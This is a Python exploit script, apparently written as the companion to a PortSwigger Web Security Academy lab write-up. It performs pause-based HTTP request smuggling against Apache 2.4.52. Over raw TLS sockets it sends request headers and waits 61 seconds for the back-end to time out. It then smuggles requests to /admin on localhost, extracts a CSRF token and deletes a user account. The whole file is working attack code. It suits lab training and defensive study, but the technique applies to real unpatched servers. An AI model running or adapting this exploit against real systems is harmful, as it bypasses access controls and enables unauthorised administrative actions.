#!/usr/bin/env python3
"""
Server-side pause-based request smuggling
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 22-server-side-pause-based-desync.md

What this does:
    Exploits Apache 2.4.52's handling of server-level redirects (CVE-class
    bug, fixed in 2.4.53): requesting /resources without a trailing slash
    triggers a 302. Sends the POST /resources headers with a declared
    Content-Length, then deliberately pauses for 61 seconds -- long enough
    for the Apache back-end to give up waiting for the body it was
    promised and process the headers-only request as a 302 redirect. The
    front-end is still patiently waiting to forward the rest of the body
    it thinks is coming. Sending the body payload after that timeout
    window delivers it as a brand new, independent request on the same
    connection -- no CL/TE header disagreement required at all, just a
    plain timeout mismatch between the two servers.

    This needs raw sockets with precise control over send timing rather
    than any HTTP library's request/response abstraction: hold the
    connection open, send exactly the header block, pause for a fixed
    duration, then send the remaining bytes. A short follow-up request
    after the smuggled body is often necessary to flush the smuggled
    response back through the pipeline.

Usage:
    python 22-server-side-pause-based-desync.py <lab-url>
    e.g. python 22-server-side-pause-based-desync.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def exploit_pause_based_desync(host: str, trigger_endpoint: str, smuggled_request: str,
                                session_cookie: str = "", pause_seconds: int = 61,
                                port: int = 443) -> bytes:
    """Send headers, pause for the back-end's timeout, then send the body
    as a smuggled request. A short GET / follow-up flushes the pipeline."""
    cookie_line = f"Cookie: session={session_cookie}\r\n" if session_cookie else ""
    headers_part = (
        f"POST {trigger_endpoint} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"{cookie_line}"
        f"Connection: keep-alive\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(smuggled_request)}\r\n"
        f"\r\n"
    )
    follow_up = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"

    s = create_ssl_connection(host, port, timeout=pause_seconds + 60)
    s.sendall(headers_part.encode())
    time.sleep(pause_seconds)
    s.sendall(smuggled_request.encode())
    time.sleep(1)
    s.sendall(follow_up.encode())

    s.settimeout(10)
    data = b""
    try:
        while True:
            chunk = s.recv(16384)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname

    client = httpx.Client(verify=False, follow_redirects=True)
    client.get(lab_url)
    session = dict(client.cookies).get("session", "")
    print(f"[+] Session: {session[:20]}...")

    print("[*] Step 1: accessing /admin via pause-based desync (61s pause)...")
    smuggled_get = "GET /admin/ HTTP/1.1\r\nHost: localhost\r\n\r\n"
    resp = exploit_pause_based_desync(host, "/resources", smuggled_get, session, pause_seconds=61)
    admin_text = resp.decode(errors="replace")

    if "/admin/delete" not in admin_text:
        print("[-] Failed to access admin panel via the pause-based desync.")
        print(f"    Response excerpt: {admin_text[:300]}")
        client.close()
        return
    print("[+] Admin panel accessed.")

    csrf_match = re.search(r'name="csrf" value="([^"]+)"', admin_text)
    csrf = csrf_match.group(1) if csrf_match else None
    if not csrf:
        print("[-] CSRF token not found in the smuggled admin panel response.")
        client.close()
        return
    print(f"[+] CSRF: {csrf}")

    print("[*] Step 2: deleting carlos via pause-based desync (61s pause)...")
    delete_body = f"csrf={csrf}&username=carlos"
    smuggled_delete = (
        f"POST /admin/delete/ HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Type: x-www-form-urlencoded\r\n"
        f"Content-Length: {len(delete_body)}\r\n"
        f"\r\n"
        f"{delete_body}"
    )
    resp2 = exploit_pause_based_desync(host, "/resources", smuggled_delete, session, pause_seconds=61)
    print(f"[+] Delete response length: {len(resp2)} bytes")

    client.close()
    check = httpx.get(lab_url + "/", verify=False)
    print(f"[+] Solved: {'is-solved' in check.text}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
